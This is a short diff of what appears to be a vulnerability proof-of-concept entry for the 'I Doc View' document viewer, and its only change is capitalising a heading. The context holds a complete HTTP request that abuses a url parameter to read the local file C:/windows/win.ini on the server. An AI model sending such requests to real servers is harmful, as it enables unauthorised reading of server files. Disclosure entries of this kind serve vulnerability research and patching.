@@ -6,7 +6,7 @@
 title="I Doc View"
 ```
 
-## poc
+## POC
 ```
 GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
 Host:  
